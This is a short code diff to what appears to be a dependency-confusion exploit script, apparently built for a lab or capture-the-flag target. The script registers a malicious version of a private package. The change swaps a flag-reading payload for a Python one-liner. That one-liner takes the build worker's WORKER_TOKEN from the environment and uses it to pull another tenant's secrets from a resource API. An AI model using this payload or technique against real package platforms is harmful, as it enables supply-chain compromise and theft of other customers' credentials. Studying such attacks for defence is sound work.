@@ -24,7 +24,11 @@ def run():
     docs = requests.get(f"{PIPELINE}/", timeout=8).json()
     req = docs["requirements"][0]
     log.append(f"[1] platform resolves private package {req['name']}=={req['version']}")
-    evil = "echo 'malicious setup running on platform worker'; cat /app/flag.txt"
+    evil = ("echo 'malicious setup running on platform worker'; "
+            "python -c \"import os,urllib.request; "
+            "r=urllib.request.Request(os.environ['RESOURCE_URL']+'/api/projects/tenant-b/secrets', "
+            "headers={'X-Worker-Token':os.environ['WORKER_TOKEN']}); "
+            "print(urllib.request.urlopen(r).read().decode())\"")
     r = requests.put(f"{REGISTRY}/packages/{req['name']}/{req['version']}",
                      data=evil, timeout=8)
     log.append(f"[2] attacker registered {req['name']}=={req['version']}: {r.json()}")
